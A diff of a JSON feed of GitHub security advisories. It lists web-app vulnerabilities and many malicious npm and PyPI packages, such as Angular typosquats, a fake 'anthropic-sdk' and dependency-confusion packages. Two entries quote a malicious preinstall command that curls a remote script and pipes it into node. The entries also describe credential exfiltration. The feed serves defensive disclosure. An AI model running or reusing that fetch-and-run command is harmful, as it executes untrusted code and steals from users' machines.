+      "summary": "Source: amazon-inspector (646c9fd4e8d09651eb6d5ec997e6d1b62f294d39d52ec3b4143853c922f15e83) \n The package.json preinstall script runs  curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node , fetching an unpinned, unverified JavaScrip",
+      "link": ""
+    },
+    {
+      "id": "GHSA-3954-6vvg-qq74",
+      "title": "[GHSA-3954-6vvg-qq74] Malicious code in @angularr/cli (npm)",
+      "published": "2026-10-05T00:30:37Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (122d8c8fdbfe9bd590dd3e1c41a6afcefff4f1c552af5f1756577975c84878a8) \n Package is published as @angularr/cli (double 'r') and copies @angular/cli's description, keywords, homepage, repository URL, README, and version string (22.2.1) to impersonate Angular's official CLI. packa",
+      "link": ""
+    },
+    {
+      "id": "GHSA-836w-242f-9mvg",
+      "title": "[GHSA-836w-242f-9mvg] Malicious code in @angulra/core (npm)",
+      "published": "2026-10-05T00:30:37Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (7ebb04f93b463536e56e0160e0e1fc2748d69c9eb15f991e990365cee7852a34) \n The package.json preinstall script runs  curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node , fetching JavaScript from an unrelated thir",
+      "link": ""
+    },
+    {
+      "id": "GHSA-xxp4-7566-29xj",
+      "title": "[GHSA-xxp4-7566-29xj] Malicious code in anthropic-sdk (PyPI)",
+      "published": "2026-10-04T21:30:21Z",
+      "ecosystem": "PIP",
+      "summary": "Source: kam193 (6844e60d4a58dd11040255e8d632bcca66ae02b1048674e79bddbac1b337f442) \n During import, package downloads a remote script, fingerprints the environment looking for sandbox signs, and after a delay exfiltrates sensitive data: credentials, env variables, AI chat files, SSH keys and so on. I",
+      "link": ""
+    },
     {
       "id": "GHSA-cxq8-x7f3-hc2x",
       "title": "[GHSA-cxq8-x7f3-hc2x] Malicious code in caoxiltts (PyPI)",
@@ -101,270 +573,6 @@
       "link": ""
     },
     {
-      "id": "GHSA-x4q3-gcj3-m6cf",
-      "title": "[GHSA-x4q3-gcj3-m6cf] gitea-runner: workflow container.options passes host namespaces and capability flags to job container when privileged mode is disabled",
-      "published": "2026-10-02T23:18:12Z",
-      "ecosystem": "GO",
-      "summary": "Summary \n act_runner appends workflow-controlled  jobs.&lt;job&gt;.container.options  directly \nto the Docker HostConfig for the job container. When runner privileged mode is \ndisabled, only  Privileged  is forced false. Host namespace flags, capability \nexpansion, and security profile overrides fro",
-      "link": ""
-    },
-    {
-      "id": "GHSA-gjj5-9665-rwrc",
-      "title": "[GHSA-gjj5-9665-rwrc] probe-image-size: Quadratic-time Denial of Service in the SVG Parser",
-      "published": "2026-10-02T23:18:02Z",
-      "ecosystem": "NPM",
-      "summary": "Overview \n  probe-image-size  scans the SVG header with a searching regular expression,  /&lt;[-_.:a-zA-Z0-9][^&gt;]*&gt;/ . On input that contains many  &lt;  characters but no  &gt; , the engine restarts the  [^&gt;]*  scan at every  &lt;  position and runs to end of input each time, giving quadra",
-      "link": ""
-    },
-    {
-      "id": "GHSA-x8gv-g2g3-65fj",
-      "title": "[GHSA-x8gv-g2g3-65fj] SiYuan Agent Tools SSRF via DNS-Rebinding TOCTOU (Bypass of CheckHostSSRF)",
-      "published": "2026-10-02T23:17:16Z",
-      "ecosystem": "GO",
-      "summary": "Security Advisory — SiYuan Agent Tools SSRF via DNS-Rebinding TOCTOU (Bypass of  CheckHostSSRF ) \n  \n \n \n Field \n Value \n \n \n \n \n  Disclosed by  \n joysinleung ( joysinleung@gmail.com ) \n \n \n  Report date  \n 2026-08-13 \n \n \n  Product  \n SiYuan (思源笔记) —  siyuan-note/siyuan  \n \n \n  Go module  \n  github",
-      "link": ""
-    },
-    {
-      "id": "GHSA-p23f-cm6q-2qp8",
-      "title": "[GHSA-p23f-cm6q-2qp8] SiYuan MCP asset.upload Reads Arbitrary Absolute File Paths (Workspace Boundary Bypass)",
-      "published": "2026-10-02T23:16:56Z",
-      "ecosystem": "GO",
-      "summary": "Security Advisory — SiYuan MCP  asset.upload  Reads Arbitrary Absolute File Paths (Workspace Boundary Bypass) \n  \n \n \n Field \n Value \n \n \n \n \n  Disclosed by  \n joysinleung ( joysinleung@gmail.com ) \n \n \n  Report date  \n 2026-08-13 \n \n \n  Product  \n SiYuan (思源笔记) —  siyuan-note/siyuan  \n \n \n  Go modu",
-      "link": ""
-    },
-    {
-      "id": "GHSA-x8mw-p69m-v3mx",
-      "title": "[GHSA-x8mw-p69m-v3mx] @fastify/busboy vulnerable to Denial of Service via prototype-named multipart part header",
-      "published": "2026-10-02T23:16:36Z",
-      "ecosystem": "NPM",
-      "summary": "Impact \n Versions of  @fastify/busboy  from 1.0.0 and prior to 3.2.1 are vulnerable to a Denial of Service. The multipart header parser stores part-header names on a plain JavaScript object, so a part header named  __proto__  or  constructor  resolves to an inherited value that is not an array, and ",
-      "link": ""
-    },
-    {
-      "id": "GHSA-xjh9-v7x6-24jw",
-      "title": "[GHSA-xjh9-v7x6-24jw] @fastify/busboy vulnerable to Denial of Service via oversized multipart boundary",
-      "published": "2026-10-02T23:16:17Z",
-      "ecosystem": "NPM",
-      "summary": "Impact \n Versions of  @fastify/busboy  from 3.1.0 and prior to 3.2.1 are vulnerable to a Denial of Service. The vendored streaming multipart search stores its default skip distance in a  Uint8Array(256) . A multipart boundary of exactly 252 bytes makes the search needle 256 bytes, and the table entr",
-      "link": ""
-    },
-    {
-      "id": "GHSA-mwm8-39rw-8826",
-      "title": "[GHSA-mwm8-39rw-8826] sqlite3-ruby: Use-After-Free in SQLite Aggregate Arguments in Heap-Allocated Argument Array",
-      "published": "2026-10-02T23:11:51Z",
-      "ecosystem": "RUBYGEMS",
-      "summary": "Summary \n Using  Database#create_aggregate ,  #create_aggregate_handler , or  Database#define_aggregator  to define an aggregate function that takes two or more arguments, and then evaluating it over TEXT or BLOB column values, can free the Ruby objects holding those arguments while a later argument",
-      "link": ""
-    },
-    {
-      "id": "GHSA-cjcg-cxmh-9wcr",
-      "title": "[GHSA-cjcg-cxmh-9wcr] Praxis affected by HTTP/2 Bomb",
-      "published": "2026-10-02T23:09:37Z",
-      "ecosystem": "RUST",
-      "summary": "Summary \n Multiple denial-of-service vulnerabilities have been discovered in HTTP/2 server implementations. All have been rated with a severity impact of  Important . The vulnerabilities target HPACK, the header compression scheme in HTTP/2, where a small request can trigger large memory allocations",
-      "link": ""
-    },
-    {
-      "id": "GHSA-h46j-26q3-rggf",
-      "title": "[GHSA-h46j-26q3-rggf] Headroom vulnerable to Cross-Site WebSocket Hijacking (CSWSH)",
-      "published": "2026-10-02T23:09:15Z",
-      "ecosystem": "PIP",
-      "summary": "Summary \n The Headroom WebSocket server does not validate the  Origin  header of incoming client WebSocket requests before forwarding the request to the upstream server, allowing malicious WebSocket clients to perform arbitrary LLM requests without authentication. This can be exploited by a maliciou",
-      "link": ""
-    },
-    {
-      "id": "GHSA-4vpg-gwqq-w44c",
-      "title": "[GHSA-4vpg-gwqq-w44c] SiYuan: 17 block metadata/content endpoints in kernel/api/block.go have zero publish-access filtering, reachable by anonymous publish-mode readers",
-      "published": "2026-10-02T23:05:33Z",
-      "ecosystem": "GO",
-      "summary": "Same CWE-862 family, found via an automated bulk sweep of every \n /api/block/*  handler in  kernel/api/block.go  for the presence of any \naccess-check reference ( IsReadOnlyRoleContext ,  checkBlockPublishAccess , \n GetPublishAccess ) anywhere in the function body. 17 of 28 candidate \nendpoints have",
-      "link": ""
-    },
-    {
-      "id": "GHSA-72qq-p3r5-f7wq",
-      "title": "[GHSA-72qq-p3r5-f7wq] @a2ui/web_core: `openUrl` permits `javascript:` URI execution via agent-supplied button actions",
-      "published": "2026-10-02T22:55:49Z",
-      "ecosystem": "NPM",
-      "summary": "Summary \n The  openUrl  function in  @a2ui/web_core  passes an agent-controlled URL directly to  window.open()  without validating the URI scheme. A malicious agent can supply a  javascript:  URI as the  url  argument of a  Button  component's  functionCall  action. When the user clicks the rendered",
-      "link": ""
-    },
-    {
-      "id": "GHSA-3cc2-h3v6-rqpq",
-      "title": "[GHSA-3cc2-h3v6-rqpq] SiYuan: Cross-Site WebSocket Hijacking on the admin-only network proxy endpoint (`/ws/network/proxy`) via explicit `CheckOrigin: true` bypass",
-      "published": "2026-10-02T22:46:18Z",
-      "ecosystem": "GO",
-      "summary": "High  \n Package \n gomod  github.com/siyuan-note/siyuan/kernel  \n Affected versions \n 3.7.3 \n Patched versions \n  (none yet — leave blank until a fix is released)  \n Description \n Summary \n  /ws/network/proxy  is an admin-only WebSocket forward-proxy endpoint (target URL and headers fully attacker-sp",
-      "link": ""
-    },
-    {
-      "id": "GHSA-2hw9-mc66-jc2q",
-      "title": "[GHSA-2hw9-mc66-jc2q] Wasmtime: Preemption and traps during bulk operations enable breaking internal VM state",
-      "published": "2026-10-02T22:45:29Z",
-      "ecosystem": "RUST",
-      "summary": "Impact \n Wasmtime's implementation of bulk-data-transfer WebAssembly instructions, such as  memory.copy , contains a vulnerability when a preemption via epochs or fuel is combined with altering the store's state or cancelling a computation. To prevent these operations from taking too long Wasmtime i",
-      "link": ""
-    },
-    {
-      "id": "GHSA-fj2x-mqqp-3v2w",
-      "title": "[GHSA-fj2x-mqqp-3v2w] Trigger.dev: Trigger CLI debug deployment logs expose resolved environment secret values",
-      "published": "2026-10-02T22:45:12Z",
-      "ecosystem": "NPM",
-      "summary": "Affected version: trigger.dev 4.5.3 (4.5.6 was advertised by the CLI but was not tested). \n A staging dry-run executed with  trigger.dev deploy --env staging --dry-run --log-level debug . The debug output logged the complete build-worker options object. Its  envVars  property contained unredacted va",
-      "link": ""
-    },
-    {
-      "id": "GHSA-8ffr-xgwf-xj56",
-      "title": "[GHSA-8ffr-xgwf-xj56] aws-smithy-json: Uncontrolled recursion in the aws-smithy-json unknown-key skip path allows unauthenticated remote denial of service in smithy-rs generated servers",
-      "published": "2026-10-02T22:44:52Z",
-      "ecosystem": "RUST",
-      "summary": "Summary \n Smithy-RS is a Rust code generation and runtime framework that generates HTTP clients and servers from Smithy interface definitions, powering the AWS SDK for Rust and custom service implementations. An issue exists which allows uncontrolled recursion in the unknown-key skip path of the Ama",
-      "link": ""
-    },
-    {
-      "id": "GHSA-v2f8-6655-7grj",
-      "title": "[GHSA-v2f8-6655-7grj] Vibe-Trading FastAPI endpoints permit unauthenticated access, file upload, and an RCE chain",
-      "published": "2026-10-02T22:44:26Z",
-      "ecosystem": "PIP",
-      "summary": "Summary: \n 5 findings — unauthenticated full-API exposure (F1, lead Critical), read-side authorization gap that persists even with  API_AUTH_KEY  set (F2), unauthenticated file write of  .py / .sh / .yaml  to a server-returned path (F3), default-permissive CORS that combines with a loopback-only che",
-      "link": ""
-    },
-    {
-      "id": "GHSA-5rmq-chc7-m22f",
-      "title": "[GHSA-5rmq-chc7-m22f] Vibe-Trading file-read tools expose arbitrary server-readable files",
-      "published": "2026-10-02T22:44:12Z",
-      "ecosystem": "PIP",
-      "summary": "Summary: \n 2 findings —  safe_user_path()  accepts any path under  Path.home()  or  Path.cwd() , which inside the shipped root container resolves to  /root  and  /app  (so all of root's home, including  /root/.ssh/id_rsa ,  /root/.aws/credentials ,  /root/.kube/config , and  /app/agent/.env , passes",
-      "link": ""
-    },
-    {
-      "id": "GHSA-jqmf-mx4f-hfr6",
-      "title": "[GHSA-jqmf-mx4f-hfr6] Vibe-Trading LLM-callable tools permit command execution, code injection, and SSRF",
-      "published": "2026-10-02T22:44:03Z",
-      "ecosystem": "PIP",
-      "summary": "Summary: \n 5 findings —  BashTool  shell-injection sink (F6, the canonical RCE primitive),  BackgroundRunTool  async shell-injection sink (F7), backtest  exec_module()  runs top-level statements before the  SignalEngine  class check (F8 — independent RCE path that does not match BashTool signatures)",
-      "link": ""
-    },
-    {
-      "id": "GHSA-4672-hwv6-gq62",
-      "title": "[GHSA-4672-hwv6-gq62] Trigger.dev: Cross-environment deployment cancel",
-      "published": "2026-10-02T22:42:40Z",
-      "ecosystem": "NPM",
-      "summary": "Summary \n Trigger.dev isolates each project into multiple  environments  ( dev ,  staging ,  prod , and per-PR  preview  branches), each with its  own secret API key  — the environment is a trust boundary (a  dev /preview/CI key is lower-trust than a  prod  key). Most API routes enforce this by scop",
-      "link": ""
-    },
-    {
-      "id": "GHSA-9q4r-4842-93vw",
-      "title": "[GHSA-9q4r-4842-93vw] Trigger.dev: Cross-tenant SQL injection in the TSQL query compiler (POST /api/v1/query) via unsanitized window-function name",
-      "published": "2026-10-02T22:42:20Z",
-      "ecosystem": "NPM",
-      "summary": "Summary \n A cross-tenant SQL injection in the TSQL query compiler lets  any authenticated trigger.dev customer read every other tenant's analytics data . The customer-facing query endpoint  POST /api/v1/query  accepts a TSQL/TRQL query that is compiled to ClickHouse SQL by  internal-packages/tsql . ",
-      "link": ""
-    },
-    {
-      "id": "GHSA-59h8-w5q6-mfmp",
-      "title": "[GHSA-59h8-w5q6-mfmp] Trigger.dev: Unauthenticated Realtime Stream Data Injection via Run FriendlyId",
-      "published": "2026-10-02T22:39:57Z",
-      "ecosystem": "NPM",
-      "summary": "Summary \n The POST handler for  /realtime/v1/streams/:runId/:streamId  has no authentication. Any entity that knows or guesses a run friendlyId can inject arbitrary data into its realtime stream. \n Vulnerability Details \n  File:   apps/webapp/app/routes/realtime.v1.streams.$runId.$streamId.ts  \n The",
-      "link": ""
-    },
-    {
-      "id": "GHSA-pqxw-g93w-hj9x",
-      "title": "[GHSA-pqxw-g93w-hj9x] Trigger.dev Self-Hosted Deployment: Default Secrets allow Unauthenticated Infrastructure Compromise",
-      "published": "2026-10-02T22:39:48Z",
-      "ecosystem": "NPM",
-      "summary": "Summary \n Self-hosted trigger.dev v4 instances deployed using the provided Docker Compose configuration with default secrets from  hosting/docker/.env.example  are vulnerable to a multi-stage unauthenticated attack chain leading to complete infrastructure compromise. \n Vulnerability Details \n The  h",
-      "link": ""
-    },
-    {
-      "id": "GHSA-62ch-8vmq-8xm7",
-      "title": "[GHSA-62ch-8vmq-8xm7] figlet is vulnerable to denial of service via unbounded loop when whitespaceBreak is used with a small width",
-      "published": "2026-10-02T22:39:16Z",
-      "ecosystem": "NPM",
-      "summary": "Impact \n A denial-of-service (infinite loop) can occur in  text()  /  textSync()  when \n both : \n \n  whitespaceBreak: true  is set,  and  \n  width  is set smaller than the rendered width of a single FIGlet character. \nUnder these conditions  breakWord()  could never find a valid break point, so the ",
-      "link": ""
-    },
-    {
-      "id": "GHSA-gg6r-gp4c-89hp",
-      "title": "[GHSA-gg6r-gp4c-89hp] Trigger.dev: V1 coordinator default-secret unauth Socket.IO",
-      "published": "2026-10-02T22:39:00Z",
-      "ecosystem": "NPM",
-      "summary": "TL;DR \n The /coordinator Socket.IO namespace mounts on every webapp boot and authenticates with a default secret (\"coordinator-secret\") baked into source. The override variable isn't documented in the self-host docs, .env.example, or helm values, so any operator who didn't read source ships with the",
-      "link": ""
-    },
-    {
-      "id": "GHSA-mhvh-fq92-pfmr",
-      "title": "[GHSA-mhvh-fq92-pfmr] geopy: Regular Expression Denial of Service (ReDoS) in geopy.Point",
-      "published": "2026-10-02T22:38:14Z",
-      "ecosystem": "PIP",
-      "summary": "Impact \n  geopy.Point  and  Point.from_string()  may take excessive CPU time when parsing long, malformed coordinate strings due to inefficient regular-expression behavior. The numeric Point constructor is not affected. \n Geocoders'  reverse  methods called with string inputs exercise the vulnerable",
-      "link": ""
-    },
-    {
-      "id": "GHSA-5wf9-h793-w73c",
-      "title": "[GHSA-5wf9-h793-w73c] Xray-core: Pinning a CA certificate via pinnedPeerCertSha256 can lead to the success of MITM attacks",
-      "published": "2026-10-02T22:35:51Z",
-      "ecosystem": "GO",
-      "summary": "Summary \n Pinning a CA certificate via  pinnedPeerCertSha256  can lead to the success of MITM attacks in some cases. \n Details \n  https://github.com/XTLS/Xray-core/blob/45cf2898ab12e97a55dd8f1f3d78d903340bdc9e/transport/internet/tls/config.go#L333-L347  \n If  r.Config.ServerName  is empty,  DNSName ",
-      "link": ""
-    },
-    {
-      "id": "GHSA-9f55-6cf9-3pgw",
-      "title": "[GHSA-9f55-6cf9-3pgw] Malware in mfahelper",
-      "published": "2026-10-02T22:35:49Z",
-      "ecosystem": "NPM",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside e",
-      "link": ""
-    },
-    {
-      "id": "GHSA-q567-cr4x-96w4",
-      "title": "[GHSA-q567-cr4x-96w4] Trigger.dev: Blind SSRF via alert-channel webhook",
-      "published": "2026-10-02T22:35:31Z",
-      "ecosystem": "NPM",
-      "summary": "Summary \n A WEBHOOK alert channel stores a user-supplied  url . When an alert fires (deployment/run failure, error groups), the webapp server ( alertsWorker  -&gt;  DeliverAlertService ) POSTs the HMAC-signed alert payload to that URL via  fetch(webhook.url, ...) . The URL is never validated against",
-      "link": ""
-    },
-    {
-      "id": "GHSA-pp95-gc86-jq6q",
-      "title": "[GHSA-pp95-gc86-jq6q] Trigger.dev: Missing Authentication in Run Replay Action Allows Cross-Organization Task Execution (IDOR)",
-      "published": "2026-10-02T22:35:24Z",
-      "ecosystem": "NPM",
-      "summary": "Summary \n The run replay  action  function at  apps/webapp/app/routes/resources.taskruns.$runParam.replay.ts  has no authentication or authorization check. While the  loader  (GET) in the same file properly calls  requireUser(request)  and scopes queries to the user's organizations, the  action  (PO",
-      "link": ""
-    },
-    {
-      "id": "GHSA-44hm-95r4-wcrf",
-      "title": "[GHSA-44hm-95r4-wcrf] Malware in @woodpecker-web-shared/components",
-      "published": "2026-10-02T22:35:01Z",
-      "ecosystem": "NPM",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside e",
-      "link": ""
-    },
-    {
-      "id": "GHSA-34p9-xxp2-hv3g",
-      "title": "[GHSA-34p9-xxp2-hv3g] Malware in bnppf-flag-icons",
-      "published": "2026-10-02T22:34:11Z",
-      "ecosystem": "NPM",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside e",
-      "link": ""
-    },
-    {
-      "id": "GHSA-3933-m2c5-xfm8",
-      "title": "[GHSA-3933-m2c5-xfm8] Malware in turbo-ws",
-      "published": "2026-10-02T22:31:50Z",
-      "ecosystem": "NPM",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside e",
-      "link": ""
-    },
-    {
-      "id": "GHSA-mw8r-6m3f-qmg8",
-      "title": "[GHSA-mw8r-6m3f-qmg8] Malware in hardhat-zet",
-      "published": "2026-10-02T21:48:55Z",
-      "ecosystem": "NPM",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside e",
-      "link": ""
-    },
-    {
       "id": "GHSA-xh7x-r46x-g84q",
       "title": "[GHSA-xh7x-r46x-g84q] Malicious code in @smwebserver/static (npm)",
       "published": "2026-10-02T21:31:59Z",
@@ -373,259 +581,211 @@
       "link": ""
     },
     {
-      "id": "GHSA-grv5-7wp6-vw6h",
-      "title": "[GHSA-grv5-7wp6-vw6h] Malware in translate-base-font",
-      "published": "2026-10-02T21:26:23Z",
+      "id": "GHSA-8r2r-7gc9-8vq8",
+      "title": "[GHSA-8r2r-7gc9-8vq8] Malicious code in brioche-apl-dev-env (npm)",
+      "published": "2026-10-02T06:31:07Z",
       "ecosystem": "NPM",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside e",
+      "summary": "brioche-apl-dev-env is a dependency-confusion package: it takes a name that looks like an internal project, uses an inflated version (100.0.0) so it outranks private-registry versions, and runs  node setup.js || true  as a preinstall script on npm install. setup.js sends the hostname, username, work",
       "link": ""
     },
     {
-      "id": "GHSA-325f-rjxf-3gm9",
-      "title": "[GHSA-325f-rjxf-3gm9] Malware in ui.dist.min.js",
-      "published": "2026-10-02T21:26:23Z",
+      "id": "GHSA-g7c3-m79h-9cqq",
+      "title": "[GHSA-g7c3-m79h-9cqq] Malicious code in alexa-cybertron-team-code-review-agent (npm)",
+      "published": "2026-10-02T06:31:07Z",
       "ecosystem": "NPM",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside e",
+      "summary": "alexa-cybertron-team-code-review-agent is a dependency-confusion package: it takes a name that looks like an internal project, uses an inflated version (100.0.0) so it outranks private-registry versions, and runs  node setup.js || true  as a preinstall script on npm install. setup.js sends the hostn",
       "link": ""
     },
     {
-      "id": "GHSA-qgqx-3mhx-jwx3",
-      "title": "[GHSA-qgqx-3mhx-jwx3] Malware in ui-base-colors",
-      "published": "2026-10-02T21:26:23Z",
+      "id": "GHSA-66jg-9x42-xwh9",
+      "title": "[GHSA-66jg-9x42-xwh9] Malicious code in apl-rive-renderer (npm)",
+      "published": "2026-10-02T06:31:07Z",
       "ecosystem": "NPM",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside e",
+      "summary": "apl-rive-renderer is a dependency-confusion package: it takes a name that looks like an internal project, uses an inflated version (100.0.0) so it outranks private-registry versions, and runs  node setup.js || true  as a preinstall script on npm install. setup.js sends the hostname, username, workin",
       "link": ""
     },
     {
-      "id": "GHSA-xxv7-2vv3-h682",
-      "title": "[GHSA-xxv7-2vv3-h682] Trigger.dev: Server-side request forgery via unvalidated webhook alert-channel URL",
-      "published": "2026-10-02T19:31:33Z",
+      "id": "GHSA-g37r-cvvp-rj75",
+      "title": "[GHSA-g37r-cvvp-rj75] Malicious code in niksinnkatalapp (npm)",
+      "published": "2026-10-02T06:31:07Z",
       "ecosystem": "NPM",
-      "summary": "Summary \n A project member can create a webhook alert channel whose delivery URL points at an internal address, and trigger.dev's control plane will send the alert there with no SSRF protection. The webhook URL is stored as an unvalidated string and is fetched directly from the webapp server, so a l",
+      "summary": "niksinnkatalapp is a dependency-confusion package: it takes a name that looks like an internal project, uses an inflated version (100.0.0) so it outranks private-registry versions, and runs  node setup.js || true  as a preinstall script on npm install. setup.js sends the hostname, username, working ",
       "link": ""
     },
     {
-      "id": "GHSA-qxpp-qjg8-x4jv",
-      "title": "[GHSA-qxpp-qjg8-x4jv] Trigger.dev: Run replay injects a task run into an attacker-chosen environment (cross-tenant write)",
-      "published": "2026-10-02T19:31:17Z",
+      "id": "GHSA-fmw8-mrp6-mj68",
+      "title": "[GHSA-fmw8-mrp6-mj68] Malicious code in figma-to-apl (npm)",
+      "published": "2026-10-02T06:31:07Z",
       "ecosystem": "NPM",
-      "summary": "Summary \n The dashboard replay action authorizes the source run (it must belong to the caller's org), but the target environment for the replayed run is taken verbatim from the request body and is never checked for org or project membership. The environment lookup used by the replay path filters by ",
+      "summary": "figma-to-apl is a dependency-confusion package: it takes a name that looks like an internal project, uses an inflated version (100.0.0) so it outranks private-registry versions, and runs  node setup.js || true  as a preinstall script on npm install. setup.js sends the hostname, username, working dir",
       "link": ""
     },
     {
-      "id": "GHSA-96h3-5x6v-m776",
-      "title": "[GHSA-96h3-5x6v-m776] Composer: GHSA-gjfg-22fp-rrxx fix bypass via symlinked package bin path",
-      "published": "2026-10-02T19:14:34Z",
-      "ecosystem": "COMPOSER",
-      "summary": "Summary \n A malicious or compromised Composer package could, when installed as a dependency, cause Composer to change the permissions of a file outside that package's own directory and to register a runnable  vendor/bin  command that points at that outside file. This is a path traversal and link fol",
-      "link": ""
-    },
-    {
-      "id": "GHSA-8mcx-5rqc-vhmf",
-      "title": "[GHSA-8mcx-5rqc-vhmf] Dulwich: Arbitrary File Write (RCE) on Windows via Unvalidated Drive Letters in Tree Paths",
-      "published": "2026-10-02T19:14:21Z",
-      "ecosystem": "PIP",
-      "summary": "Affected files \n \n  dulwich/index.py  (Methods:  validate_path_element_ntfs ,  _tree_to_fs_path ) \n  dulwich/porcelain/__init__.py  (Method:  _checked_worktree_path ) \n \n Description / Summary \n A High-severity Path Traversal vulnerability exists in Dulwich's checkout logic when running on Windows. ",
-      "link": ""
-    },
-    {
-      "id": "GHSA-35mr-4567-66vg",
-      "title": "[GHSA-35mr-4567-66vg] Dulwich: Infinite Loop Denial of Service (DoS) in Packfile Object Resolution",
-      "published": "2026-10-02T18:54:39Z",
-      "ecosystem": "PIP",
-      "summary": "Affected file \n \n  dulwich/pack.py  (Method:  Pack.resolve_object ) \n \n Description / Summary \n A High-severity Denial of Service (DoS) vulnerability exists in the  Pack.resolve_object  method. When resolving an  OFS_DELTA  object, the resolver calculates the base offset using  base_offset = obj_off",
-      "link": ""
-    },
-    {
-      "id": "GHSA-8w8g-wq8h-fq33",
-      "title": "[GHSA-8w8g-wq8h-fq33] Dulwich: Symlink write-through in checkout(paths=[]) via raw os.open bypasses all symlink protections",
-      "published": "2026-10-02T18:53:35Z",
-      "ecosystem": "PIP",
-      "summary": "Summary \n Dulwich's  porcelain.checkout(paths=[...])  code path writes files using raw  os.open(file_path, O_WRONLY|O_CREAT|O_TRUNC, mode)  followed by  f.write(obj.data) . This code path does NOT call  build_file_from_blob()  at all, completely bypassing any symlink protections (including the unrel",
-      "link": ""
-    },
-    {
-      "id": "GHSA-5fqc-mrg8-w798",
-      "title": "[GHSA-5fqc-mrg8-w798] Dulwich: Symlink directory traversal in filter-branch index_filter via cross-commit state persistence",
-      "published": "2026-10-02T18:53:05Z",
-      "ecosystem": "PIP",
-      "summary": "Summary \n Dulwich's  filter_branch.py   CommitFilter._apply_index_filter()  is vulnerable to symlink directory traversal. When processing commit history, materialized tree entries (including symlinks) persist in the working directory between commits, allowing a symlink from an ancestor commit to red",
-      "link": ""
-    },
-    {
-      "id": "GHSA-cm62-gvxx-vmxx",
-      "title": "[GHSA-cm62-gvxx-vmxx] Dulwich: Symlink directory traversal in stash pop allows arbitrary file write via intermediate directory symlinks",
-      "published": "2026-10-02T18:52:53Z",
-      "ecosystem": "PIP",
-      "summary": "Summary \n Dulwich's  stash.py:pop()  function is vulnerable to symlink directory traversal, allowing an attacker to write arbitrary files outside the repository worktree when a victim pops a stash in a malicious repository. \n Root Cause \n The  pop()  function at  dulwich/stash.py:236  uses  os.path.",
-      "link": ""
-    },
-    {
-      "id": "GHSA-mc5h-r7fw-gr4j",
-      "title": "[GHSA-mc5h-r7fw-gr4j] Malicious code in dedh-devops-automation (PyPI)",
-      "published": "2026-10-02T15:31:12Z",
-      "ecosystem": "PIP",
-      "summary": "Source: kam193 (e623272b4de65cc8af24a44d5405d9f6baa2c42896b50f9b7e0e5f294bfd2722) \n During installation, the package deploys a rogue AWS Lambda function to collect credentials from Secret Manager as well as collect other data. Data are then exfiltrated. \n \n Category: MALICIOUS - The campaign has cle",
-      "link": ""
-    },
-    {
-      "id": "GHSA-ch52-4w7c-c8xp",
-      "title": "[GHSA-ch52-4w7c-c8xp] http-cache-semantics max-stale handling can disclose cross-user cached responses",
-      "published": "2026-09-18T18:31:44Z",
+      "id": "GHSA-427x-rv7c-m3f9",
+      "title": "[GHSA-427x-rv7c-m3f9] Malicious code in ai-workshop-radio-lambda (npm)",
+      "published": "2026-10-02T06:31:07Z",
       "ecosystem": "NPM",
-      "summary": "http-cache-semantics through 4.2.0 fails to properly validate security-zeroed cache entries when processing client max-stale directives, allowing unauthenticated attackers to retrieve cached responses belonging to other users. Attackers can request the same URL with a large max-stale value to obtain",
+      "summary": "ai-workshop-radio-lambda is a dependency-confusion package: it takes a name that looks like an internal project, uses an inflated version (100.0.0) so it outranks private-registry versions, and runs  node setup.js || true  as a preinstall script on npm install. setup.js sends the hostname, username,",
       "link": ""
     },
     {
-      "id": "GHSA-vfj7-8cjw-p6xm",
-      "title": "[GHSA-vfj7-8cjw-p6xm] braces vulnerable to stack-exhaustion denial of service through deeply nested patterns",
-      "published": "2026-09-18T18:31:41Z",
+      "id": "GHSA-7rq8-hfxr-pxhw",
+      "title": "[GHSA-7rq8-hfxr-pxhw] Malicious code in okra-cloud-cdk (npm)",
+      "published": "2026-10-02T06:31:07Z",
       "ecosystem": "NPM",
-      "summary": "braces through 3.0.3 contains a stack overflow vulnerability in the recursive AST walkers that lack depth guards. Attackers can supply deeply nested brace patterns under the character limit to exhaust the call stack and terminate the Node.js process with an uncaught RangeError. \n            Affected",
+      "summary": "okra-cloud-cdk is a dependency-confusion package: it takes a name that looks like an internal project, uses an inflated version (100.0.0) so it outranks private-registry versions, and runs  node setup.js || true  as a preinstall script on npm install. setup.js sends the hostname, username, working d",
       "link": ""
     },
     {
-      "id": "GHSA-69jp-f2p8-9vrg",
-      "title": "[GHSA-69jp-f2p8-9vrg] Duplicate Advisory: 17 block metadata/content endpoints in kernel/api/block.go have zero publish-access filtering, reachable by anonymous publish-mode readers",
-      "published": "2026-08-18T12:31:21Z",
-      "ecosystem": "GO",
-      "summary": "Duplicate Advisory \n This advisory has been withdrawn because it is a duplicate of  GHSA-4vpg-gwqq-w44c . This link is maintained to preserve external references. \n Original Description \n SiYuan before v3.7.4 is missing authorization checks in 17 block metadata/content endpoints in kernel/api/block.",
+      "id": "GHSA-5m79-v4p8-r597",
+      "title": "[GHSA-5m79-v4p8-r597] Malicious code in ai-workshop-maa15-radio (npm)",
+      "published": "2026-10-02T06:31:07Z",
+      "ecosystem": "NPM",
